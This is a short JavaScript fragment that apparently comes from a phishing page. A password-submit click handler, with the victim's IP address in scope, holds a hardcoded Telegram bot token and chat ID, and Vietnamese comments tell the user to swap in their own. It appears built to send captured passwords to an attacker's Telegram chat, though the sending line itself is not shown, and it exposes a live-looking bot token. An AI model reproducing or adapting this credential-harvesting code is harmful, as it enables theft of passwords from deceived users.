...
function showPrompt(IpAddress) {
    ...
    $('#submit-password').on('click', function () {
        ...
        const botToken = '7915689883:AAFk_jhQ4aVXoZ8RAjcVuYl1K0_Rk78yD_o'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
        const chatId = '-1002674039533'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
